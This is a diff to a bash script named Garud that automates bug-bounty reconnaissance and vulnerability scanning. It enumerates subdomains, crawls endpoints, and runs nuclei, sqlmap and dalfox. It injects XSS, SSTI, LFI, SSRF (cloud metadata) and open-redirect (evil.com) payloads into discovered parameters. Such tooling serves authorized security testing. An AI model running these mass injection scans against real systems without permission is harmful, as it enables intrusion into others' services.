@@ -2,19 +2,22 @@
 # coded by R0X4R
 # Contributers: KathanP19 (https://github.com/KathanP19), f8al (https://github.com/f8al), theamanrawat (https://github.com/theamanrawat), remonsec (https://github.com/remonsec), simrotion13 (https://github.com/simrotion13)
 
+# Check connection
 wget -q --spider http://google.com
 if [ $? -ne 0 ];then
-    echo "Connect to internet before running this tool!"
+    echo "Connect to internet before running Garud!"
     exit 1
 fi
 
+# Variables
 domain=
-output=
-excl=
-thrds=
-bxssServer=
+outdir=
+exclude=
+threads=
+blindxss=
 
-load_colors() {
+# Colors
+initColors() {
     RED="\e[31m"
     BOLD="\e[1m"
     NORMAL="\e[0m"
@@ -23,94 +26,77 @@ load_colors() {
     BLINK="\e[5m"
 }
 
-usage() {
-    load_colors
+# Print usage
+printUsage() {
+    initColors
     echo -e "${RED}\n█▀▀ ▄▀█ █▀█ █░█ █▀▄"
-    echo -e "${RED}█▄█ █▀█ █▀▄ █▄█ █▄▀"
+    echo -e "█▄█ █▀█ █▀▄ █▄█ █▄▀"
     echo -e "${NORMAL}${BOLD}\ncoded by ${GREEN}R0X4R${NORMAL}${BOLD} in INDIA with ${RED}<3${NORMAL}"
     echo -e "\nExample Usage:"
-    echo -e "garud [-d target.com] [-f output destination] [-t threads] [-b blind xss URL] [-x OOS domains] \n"
+    echo -e "garud [-d target.tld] [-o output destination] [-t threads] [-b blind xss URL] [-x OOS domains] \n"
     echo -e "FLags:"
-    echo -e "  -d        Add your target (e.g -d target.com)"
-    echo -e "  -f        Write to output folder (e.g -f results/)"
+    echo -e "  -d        Add your target (e.g -d target.tld)"
+    echo -e "  -o        Write to output folder (e.g -o results/)"
     echo -e "  -t        Number of threads [Default: 100] (e.g. -t 300)"
     echo -e "  -b        Add your xss server for BXSS [Default: false] (e.g. -b test.xss.ht)"
     echo -e "  -x        Exclude out of scope domains [Default: false] (e.g. -x ~/oosdomains.txt)\n"
     exit 1
 }
 
-while getopts ":b:d:f:h:t:x:" o; do
-    case "${o}" in
+# Argument flags
+while getopts ":b:d:o:h:t:x:" opt; do
+    case "${opt}" in
         b)
-            bxssServer=${OPTARG} ;;
+            blindxss=${OPTARG} ;;
 
         d)
             domain=${OPTARG} ;;
 
-        f)
-            output=${OPTARG} ;;
+        o)
+            outdir=${OPTARG} ;;
 
         h)
-            usage ;;
+            printUsage ;;
 
         t)
-            thrds=${OPTARG} ;;
+            threads=${OPTARG} ;;
 
         x)
-            excl=${OPTARG} ;;
+            exclude=${OPTARG} ;;
 
         *)
-            usage ;;
-
+            printUsage ;;
     esac
 done
 
+# Intial config
 if [ -z "$domain" ]
-  then
-    load_colors
-    echo -e "${RED}\n█▀▀ ▄▀█ █▀█ █░█ █▀▄"
-    echo -e "${RED}█▄█ █▀█ █▀▄ █▄█ █▄▀"
-    echo -e "${NORMAL}${BOLD}\ncoded by ${GREEN}R0X4R${NORMAL}${BOLD} in INDIA with ${RED}<3${NORMAL}"
-    echo -e " "
-    echo -e "${NORMAL}${BOLD}${RED}${BLINK}[ERROR] - Target not supplied. ${NORMAL}"
-    echo -e "\nExample Usage:"
-    echo -e "garud [-d target.com] [-f output destination] [-t threads] [-b blind xss URL] [-x OOS domains] \n"
-    echo -e "FLags:"
-    echo -e "  -d        Add your target (e.g -d target.com)"
-    echo -e "  -f        Write to output folder (e.g -f results/)\n"
-    exit 1
-fi
-
-if [ -z "$output" ]
-  then
-    load_colors
-    echo -e "${RED}\n█▀▀ ▄▀█ █▀█ █░█ █▀▄"
-    echo -e "${RED}█▄█ █▀█ █▀▄ █▄█ █▄▀"
-    echo -e "${NORMAL}${BOLD}\n coded by ${GREEN}R0X4R${NORMAL}${BOLD} in INDIA with ${RED}<3${NORMAL}"
-    echo -e " "
-    echo -e "${NORMAL}${BOLD}${RED}${BLINK}[ERROR] - Output directory not supplied. ${NORMAL}"
-    echo -e "\nExample Usage:"
-    echo -e "garud [-d target.com] [-f output destination] [-t threads] [-b blind xss URL] [-x OOS domains] \n"
-    echo -e "FLags:"
-    echo -e "  -d        Add your target (e.g -d target.com)"
-    echo -e "  -f        Write to output folder (e.g -f results/)\n"
-    exit 1
-fi
-
-if [ -z "$thrds" ]
     then
-    thrds=100
+        echo -e "\n${NORMAL}${BOLD}[${RED}${BLINK}ERROR${NORMAL}${BOLD}] - Target not supplied.\n${NORMAL}"
+        printUsage
 fi
 
-if [ ! -d "$output" ]; then
-    mkdir -p $output
+if [ -z "$outdir" ]
+    then
+        echo -e "\n${NORMAL}${BOLD}[${RED}${BLINK}ERROR${NORMAL}${BOLD}] - Output destination not supplied.\n${NORMAL}"
+        printUsage
 fi
 
-cd $output/
+if [ -z "$threads" ]
+    then
+    threads=100
+fi
 
-show_logo() {
+if [ ! -d "$outdir" ]
+    then
+        mkdir -p $outdir
+fi
+
+cd $outdir
+
+# Print banner
+printBanner() {
 	clear
-
     echo -e ${GREEN}"""\n	
           .                                                      .
         .n                   .                 .                  n.
@@ -120,7 +106,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
 9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
  9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
   v9XXXXXXXXXXXXXXXXXXXXXi-   -vOOO8b   d8OOOi-   -vXXXXXXXXXXXXXXXXXXXXXPi
-    v9XXXXXXXXXXXPi v9XXi   DIE    v98v8Pi  HUMAN   vXXPi v9XXXXXXXXXXXPi
+    v9XXXXXXXXXXXPi v9XXi          v98v8Pi           vXXPi v9XXXXXXXXXXXPi
         -------       9X.          .db|db.          .XP       -------
                         )b.  .dbo.dPivviv9b.odb.  .dX(
                       ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
@@ -135,190 +121,143 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                                v             i """
 
     echo -e "${RED}\n                             █▀▀ ▄▀█ █▀█ █░█ █▀▄"
-    echo -e "${RED}                             █▄█ █▀█ █▀▄ █▄█ █▄▀"
+    echo -e "                            █▄█ █▀█ █▀▄ █▄█ █▄▀"
     echo -e "${NORMAL}${BOLD}\n                        coded by ${GREEN}R0X4R${NORMAL}${BOLD} in INDIA with ${RED}<3${NORMAL}\n"
-    sleep 1
+    sleep 1s
 }
 
-scan_targets() {
-    echo -e " "
-    echo -e "Target: $domain"
-    echo -e "Output: $(pwd)"
-    echo -e "Threads: $thrds"
-}
+SECONDS=0
 
+# Make folders to store output
 makeFolders() {
-    mkdir -p domains/
-    mkdir -p domains/info/
-    mkdir -p parameters/
-    mkdir -p parameters/patterns/
-    mkdir -p scanresults/
-    mkdir -p scanresults/xss/
-    mkdir -p scanresults/nuclei/
-    mkdir -p scanresults/crlf/
-    mkdir -p scanresults/sqli/
-    mkdir -p scanresults/lfi/
-    mkdir -p scanresults/ssti/
-    mkdir -p scanresults/mail/
-    mkdir -p scanresults/files/
-    mkdir -p scanresults/redirect/
+    mkdir -p enumeration/
+    mkdir -p enumeration/domains/
+    mkdir -p enumeration/parameters/
+    mkdir -p enumeration/patterns/
+    mkdir -p injections/
+    mkdir -p nuclei/
 }
 
-run_subenum() {
-    echo -ne "${NORMAL}${BOLD}${YELLOW}\n ● Scanning is in progress:${NORMAL}${BOLD} Scanning subdomains of $domain [${GREEN}${BLINK}20%${NORMAL}] \r"
-    assetfinder --subs-only $domain | anew -q domains/assetfinder.txt &> /dev/null
-    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -o domains/sublister.txt &> /dev/null
-    subfinder -silent -d $domain -all -t $thrds -o domains/subfinder.txt > /dev/null
-    amass enum -passive -norecursive -noalts -d $domain -o domains/amass.txt &> /dev/null
-    amass enum -active -brute -w ~/wordlists/dns.txt -d $target -o domains/amassact.txt &> /dev/null
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Filtering subdomains of $domain [${GREEN}${BLINK}30%${NORMAL}] \r"
-    sleep 1s
-    if [ -f "$excl" ]
+# Subdomain enumeration
+subEnum() {
+    echo -e "${BOLD}Starting subdomain enumeration of $domain${NORMAL}"
+    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$domain" | anew -q enumeration/domains/crt.txt &> /dev/null
+    curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" | grep -o "\w.*$domain" | anew -q enumeration/domains/hacker.txt &> /dev/null
+    curl -s "https://riddler.io/search/exportcsv?q=pld:$domain" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$domain" | anew -q enumeration/domains/riddler.txt &> /dev/null
+    assetfinder --subs-only $domain | anew -q enumeration/domains/assetfinder.txt &> /dev/null
+    python3 ~/tools/Sublist3r/sublist3r.py -d $domain -o enumeration/domains/sublister.txt &> /dev/null
+    subfinder -silent -d $domain -all -t $threads -o enumeration/domains/subfinder.txt > /dev/null
+    amass enum -passive -d $domain -o enumeration/domains/amass.txt &> /dev/null
+    crobat -s $domain | anew -q enumeration/domains/crobat.txt &> /dev/null
+    ffuf -u http://FUZZ.$domain/ -t 200 -p 1.0-2.0 -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200,404,403 -o ffuf.json -s &> /dev/null
+    # Filter domains
+    cat ffuf.json | jq -r '.results[] | {status:.status, host:.host} | select (.status == 200) | .host' 2> /dev/null | anew -q enumeration/domains/ffuf.txt &> /dev/null
+    cat ffuf.json | jq -r '.results[] | {status:.status, host:.host} | select (.status == 404) | .host' 2> /dev/null | anew -q enumeration/domains/ffuf.txt &> /dev/null
+    cat ffuf.json | jq -r '.results[] | {status:.status, host:.host} | select (.status == 403) | .host' 2> /dev/null | anew -q enumeration/domains/ffuf.txt &> /dev/null
+    cat enumeration/domains/*.txt | grep -v "*" | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | grep "$domain" | anew -q tempdomains.txt
+    # Finding second level domains
+    cat tempdomains.txt | xargs -P 50 -I % bash -c "assetfinder --subs-only % | anew -q enumeration/domains/sldomains.txt" &> /dev/null
+    # Filtering outofscope domains
+    if [ -f "$exclude" ]
         then
-            cat domains/*.txt | grep -v "*" | grep -vf $excl | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q domains/finalsubdomains.txt &> /dev/null
+            cat enumeration/domains/*.txt | grep -v "*" | grep -vf $exclude | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q enumeration/subdomains.txt &> /dev/null
         else
-            cat domains/*.txt | grep -v "*" | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q domains/finalsubdomains.txt &> /dev/null
+            cat enumeration/domains/*.txt | grep -v "*" | sort -u | sed '/@/d' | sed '/<BR>/d' | sed '/\_/d'| sed '/*/d' | dnsx -t 100 -silent | anew -q enumeration/subdomains.txt &> /dev/null
     fi
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Filtering valid subdomains of $domain [${GREEN}${BLINK}35%${NORMAL}] \r"
-    sleep 1s
-    cat domains/finalsubdomains.txt | sort -u | uniq -u | httpx -threads $thrds -tls-probe -csp-probe -silent | anew -q domains/activeurls.txt &> /dev/null
-    cat domains/activeurls.txt | sed -E 's/^\s*.*:\/\///g' | anew -q domains/hosts.txt &> /dev/null
+    xargs -a enumeration/subdomains.txt -P 50 -I % bash -c "echo % | httpx -silent -random-agent -tls-probe -csp-probe -threads 150 -ports 80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017" 2> /dev/null | anew -q enumeration/liveurls.txt &> /dev/null
+    xargs -a enumeration/subdomains.txt -P 50 -I % bash -c "echo % | httpx -silent -random-agent -tls-probe -csp-probe -threads 150 -ports 80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017 -status-code -title" 2> /dev/null | anew -q enumeration/titles.txt &> /dev/null
+    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path /snap/bin/chromium -out enumeration/aquatone/ -threads 10 -silent" 2> /dev/null &> /dev/null
+    echo -e "Subdomain enumeration completed, total [passive:$(cat enumeration/domains/sldomains.txt | wc -l)  active:$(cat enumeration/subdomains.txt | wc -l)  activeurls:$(cat enumeration/liveurls.txt | wc -l)] found"
+    echo -e "Subdomain enumeration completed, total [passive:$(cat enumeration/domains/sldomains.txt | wc -l)  active:$(cat enumeration/subdomains.txt | wc -l)  activeurls:$(cat enumeration/liveurls.txt | wc -l)] found" | notify -silent &> /dev/null
 }
 
-run_info() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Fetching some imformations of valid subdomains of $domain [${GREEN}${BLINK}40%${NORMAL}] \r"
-    cat domains/activeurls.txt | httpx -threads $thrds -status-code -title -silent | anew -q domains/info/titles.txt
-    cat domains/activeurls.txt | aquatone -chrome-path /snap/bin/chromium -out domains/info/aquatone/ -threads 10 -silent &> /dev/null
+# Crawling subdomains
+subCrawl() {
+    echo -e "${BOLD}Crawling subdomains of $domain${NORMAL}"
+    echo -e "Crawling subdomains of $domain" | notify -silent &> /dev/null
+    gospider -S enumeration/liveurls.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o enumeration/temp/gospider 2> /dev/null | anew -q enumeration/parameters/gospider.txt && rm -rf out/ &> /dev/null
+    cat enumeration/liveurls.txt | xargs -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q enumeration/parameters/wayback.txt &> /dev/null
+    cat enumeration/liveurls.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o enumeration/parameters/gauplus.txt &> /dev/null
+    cat enumeration/parameters/*.txt | subjs -c 50 | parallel -j 20 'echo "{}" | python3 ~/tools/JSA/jsa.py' 2> /dev/null | anew -q enumeration/parameters/jslinks.txt &> /dev/null
+    # Filtering all parameters
+    cat enumeration/parameters/*.txt | grep $domain | sort -u | urldedupe -s | anew -q enumeration/endpoints.txt &> /dev/null
+    # Filtering endpoints using gf patterns
+    cat enumeration/endpoints.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/xss.txt
+    cat enumeration/endpoints.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/ssrf.txt
+    cat enumeration/endpoints.txt | gf ssti | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/ssti.txt
+    cat enumeration/endpoints.txt | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/redirect.txt
+    cat enumeration/endpoints.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/sqli.txt
+    cat enumeration/endpoints.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/lfi.txt
+    cat enumeration/endpoints.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q enumeration/patterns/rce.txt
+    cat ~/tools/payloads/sstipayloads.txt | while read -r line; do cat enumeration/patterns/ssti.txt | qsreplace "$line" 2> /dev/null | anew -q tempssti.txt;done
+    cat ~/tools/payloads/lfipayloads.txt | while read -r line; do cat enumeration/patterns/lfi.txt | qsreplace "$line" 2> /dev/null | anew -q templfi.txt;done
+    cat enumeration/patterns/ssrf.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q tempssrf.txt
+    cat enumeration/patterns/xss.txt | qsreplace "\">/><svg/onload=confirm(document.domain)>" 2> /dev/null | anew -q tempxss.txt
+    cat enumeration/parameters/patterns/redirect.txt | qsreplace "http://www.evil.com/" 2> /dev/null | anew -q tempred.txt
 }
 
-run_params() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Getting all parameters of $domain [${GREEN}${BLINK}70%${NORMAL}] \r"
-    cat domains/activeurls.txt | xargs -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q parameters/wayback.txt &> /dev/null
-    cat domains/activeurls.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt,js -t $thrds -o parameters/gauplus.txt &> /dev/null
-    cat parameters/*.txt | urldedupe -s | anew -q parameters/allParameters.txt &> /dev/null
+# Starting nuclei scan on targets
+nucScan() {
+    echo -e "${BOLD}Scanning for vulnerabilites of $domain using nuclei${NORMAL}"
+    echo -e "Scanning for vulnerabilites of $domain using nuclei" | notify -silent &> /dev/null
+    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity info -c 50 -silent" 2> /dev/null | anew -q nuclei/info.txt | notify -silent &> /dev/null
+    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity low -c 50 -silent" 2> /dev/null | anew -q nuclei/low.txt | notify -silent &> /dev/null
+    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity medium -c 50 -silent" 2> /dev/null | anew -q nuclei/medium.txt | notify -silent &> /dev/null
+    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity high -c 50 -silent" 2> /dev/null | anew -q nuclei/high.txt | notify -silent &> /dev/null
+    xargs -a enumeration/liveurls.txt -P 50 -I % bash -c "nuclei -target % -t ~/nuclei-templates/ -severity critical -c 50 -silent" 2> /dev/null | anew -q nuclei/critical.txt | notify -silent &> /dev/null
+    echo -e "${BOLD}Vulnerability scanning completed using nuclei, total $(cat nuclei/*.txt | sed '/[info]/d' | sed '/cors\|x\-frame\|general\-tokens\|header\-sqli\|header\-reflection\|pantheon\-takeover\|host\-header\-poisioning\|detect\-all\-takeovers\:\pantheon\.io\|2019\-7192\|2020\-19719/d' | wc -l) vulnerabilities found${NORMAL}"
+    echo -e "Vulnerability scanning completed using nuclei, total $(cat nuclei/*.txt | sed '/[info]/d' | sed '/cors\|x\-frame\|general\-tokens\|header\-sqli\|header\-reflection\|pantheon\-takeover\|host\-header\-poisioning\|detect\-all\-takeovers\:\pantheon\.io\|2019\-7192\|2020\-19719/d' | wc -l) vulnerabilities found" | notify -silent &> /dev/null
 }
 
-run_gf() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Filtering all parameters of $domain [${GREEN}${BLINK}75%${NORMAL}] \r"
-    cat parameters/allParameters.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/xss.txt
-    cat parameters/allParameters.txt | gf ssrf | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/ssrf.txt
-    cat parameters/allParameters.txt | gf ssti | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/ssti.txt
-    cat parameters/allParameters.txt | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/redirect.txt
-    cat parameters/allParameters.txt | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/sqli.txt
-    cat parameters/allParameters.txt | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/lfi.txt
-    cat parameters/allParameters.txt | gf rce | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q parameters/patterns/rce.txt
-}
-
-check_crlf() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for crlf in $domain [${GREEN}${BLINK}85%${NORMAL}] \r"
-    crlfuzz -l domains/activeurls.txt -c $thrds -s | anew scanresults/crlf/output.txt | notify -silent &> /dev/null
-}
-
-check_mail() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for email spoofing errors in $domain [${GREEN}${BLINK}86%${NORMAL}] \r"
-    for target in $(echo "$domain"); do if [[ $(curl --connect-timeout 3 -kls --max-time 3 -d "serial=fred12&domain=${target}" -H "Content-Type: application/x-www-form-urlencoded" -X POST "https://www.kitterman.com/spf/getspf3.py") =~ 'SPF record passed validation test with pySPF' ]]; then echo -e "VULNERABLE: ${target}"; else echo -e "NOT VULNERABLE: ${target}"; fi done | anew scanresults/mail/spf.txt | notify -silent &> /dev/null
-    for target in $(echo "$domain"); do if [[ $(curl --connect-timeout 3 -kls --max-time 3 -X GET "https://dmarcly.com/server/dmarc_check.php?domain=${target}") =~ 'success' ]]; then echo -e "VULNERABLE: ${target}"; else echo -e "NOT VULNERABLE: ${target}"; fi done | anew scanresults/mail/email.txt | notify -silent &> /dev/null
-}
-
-check_ssti() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for ssti vulnerabilities in $domain [${GREEN}${BLINK}87%${NORMAL}] \r"
-    cat ~/tools/payloads/ssti.txt | while read -r line; do cat parameters/patterns/ssti.txt | qsreplace "$line" | anew -q ssticheck.txt;done &> /dev/null
-    cat ssticheck.txt | xargs -P 100 -I host bash -c "curl -s -L 'host' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - host \n \"" 2> /dev/null | grep "VULNERABLE" | anew scanresults/ssti/output.txt | notify -silent &> /dev/null
-    rm -rf ssticheck.txt
-}
-
-check_lfi() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for lfi vulnerabilities in $domain [${GREEN}${BLINK}88%${NORMAL}] \r"
-    cat ~/tools/payloads/lfi.txt | while read -r line; do cat parameters/patterns/lfi.txt | qsreplace "$line" | anew -q lficheck.txt;done &> /dev/null
-    cat lficheck.txt | xargs -P 100 -I host bash -c "curl -s -L 'host' | grep \"root:x:\" && echo -e \"[VULNERABLE] - host \n \"" 2> /dev/null| grep "VULNERABLE" | anew scanresults/lfi/output.txt | notify -silent &> /dev/null # fixed false positive
-    rm -rf lficheck.txt
-}
-
-check_nuclei() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for vulnerabilities of $domain using nuclei [${GREEN}${BLINK}89%${NORMAL}] \r"
-    cat domains/activeurls.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity low -c 500 -nc -silent;done | anew scanresults/nuclei/low.txt | notify -silent &> /dev/null
-    cat domains/activeurls.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity medium -c 500 -nc -silent;done | anew scanresults/nuclei/medium.txt | notify -silent &> /dev/null
-    cat domains/activeurls.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity high -c 500 -nc -silent;done | anew scanresults/nuclei/high.txt | notify -silent &> /dev/null
-    cat domains/activeurls.txt | while read -r line;do nuclei -t ~/nuclei-templates/ -target $line -severity critical -c 500 -nc -silent;done | anew scanresults/nuclei/critical.txt | notify -silent &> /dev/null
-}
-
-check_infoleak() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for directories and sensitive files of $domain [${GREEN}${BLINK}90%${NORMAL}] \r"
-    cat parameters/allParameters.txt | cut -d"?" -f1 | cut -d"=" -f1 | anew -q removed.txt &> /dev/null
-    cat removed.txt | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | httpx -silent -follow-host-redirects | anew scanresults/files/output.txt | notify -silent &> /dev/null
-    rm -rf removed.txt
-}
-
-check_sqli() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for sqli vulnerabilities of $domain using sqlmap [${GREEN}${BLINK}92%${NORMAL}] \r"
-    cat parameters/patterns/sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --output-dir=scanresults/sqli/" &> /dev/null
-}
-
-check_xss() {
-    sleep 1s
-    echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for xss in $domain [${GREEN}${BLINK}95%${NORMAL}] \r"
-    cat parameters/patterns/xss.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >" | anew -q scanresults/xss/kxss.txt &> /dev/null
-    cat parameters/patterns/xss.txt | qsreplace "\">/><svg/onload=confirm(document.domain)>" 2> dev/null | xargs -P 50 -I % bash -c "curl -s -L --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" 2> /dev/null | grep "POTENTIAL XSS" | anew scanresults/xss/xss.txt | notify -silent &> /dev/null
-    if [ -n "$bxssServer" ]
-        then
-            dalfox file parameters/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $thrds -b $bxssServer 2> /dev/null | anew -q scanresults/xss/dalfox.txt &> /dev/null
+# Scanning for common injection vulnerabilities
+injScan() {
+    echo -e "${BOLD}Scanning for common injection vulnerabilities of $domain${NORMAL}"
+    echo -e "Scanning for common injection vulnerabilities of $domain" | notify -silent &> /dev/null
+    crlfuzz -l enumeration/liveurls.txt -c $threads -s | anew injections/crlf.txt | notify -silent &> /dev/null
+    sed 's/$/\?__proto__[testparam]=exploit/' enumeration/liveports.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULN]"' 2> /dev/null | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | anew injections/proto.txt | notify -silent &> /dev/null
